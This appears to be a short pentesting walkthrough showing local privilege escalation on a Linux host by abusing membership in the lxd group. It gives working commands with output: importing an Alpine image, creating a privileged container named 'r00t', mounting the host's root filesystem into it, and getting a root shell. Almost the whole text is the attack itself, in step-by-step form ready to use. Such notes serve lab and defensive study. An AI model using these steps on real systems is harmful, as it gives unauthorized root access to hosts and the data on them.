
---
LXD(Linux Containers) is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group.

```bash
devops@NIX02:~$ id uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

To check if lxd is initialized and you can modify it.
```bash
lxc image list
#If its output is empty or a list means lxd function normally.
```
Or initialize it :
```bahs
lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge

```

Unzip the Alpine image.
```bash
devops@NIX02:~$ unzip alpine.zip 

Archive: alpine.zip extracting: 64-bit 
Alpine/alpine.tar.gz inflating: 64-bit 
Alpine/alpine.tar.gz.root 
cd 64-bit\ Alpine/
```

Import the local image.
```bash
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine 

Generating a client certificate. This may take a minute... If this is your first time using LXD, you should also run: sudo lxd init To start your first container, try: lxc launch ubuntu:16.04 

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Start a privileged container to run the container without a UID mapping, making the root user in the container the same as the root on the host.
```bash
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true 

Creating r00t
#Name of the container.
```

Mount the host file system into r00t :
```bash
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

```bash
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
```













